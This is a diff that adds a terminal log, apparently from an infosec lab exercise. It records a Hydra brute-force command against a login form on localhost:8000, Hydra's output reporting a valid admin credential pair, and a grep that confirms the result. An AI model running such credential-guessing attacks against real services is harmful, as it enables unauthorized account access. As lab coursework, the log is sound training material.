@@ -1,0 +1,14 @@
+vagrant@vagrant:~/infosec/lab12$ hydra -f -I -V -L usernames.txt -P wordlist.txt -s 8000 localhost http-form-post "/login:username=^USER^&password=^PASS^:F=Invalid" 2>&1 | tee proof/hydra_run.log
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, 
+or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-01 19:54:00
+[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
+[DATA] attacking http-post-form://localhost:8000/login:username=^USER^&password=^PASS^:F=Invalid
+[ATTEMPT] target localhost - login "admin" - pass "12345admin" - 1 of 1 [child 0] (0/0)
+[8000][http-post-form] host: localhost   login: admin   password: 12345admin
+[STATUS] attack finished for localhost (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-01 19:54:00
+vagrant@vagrant:~/infosec/lab12$ grep -i "valid pair" proof/hydra_run.log || grep -i "login:" proof/hydra_run.log       
+[STATUS] attack finished for localhost (valid pair found)
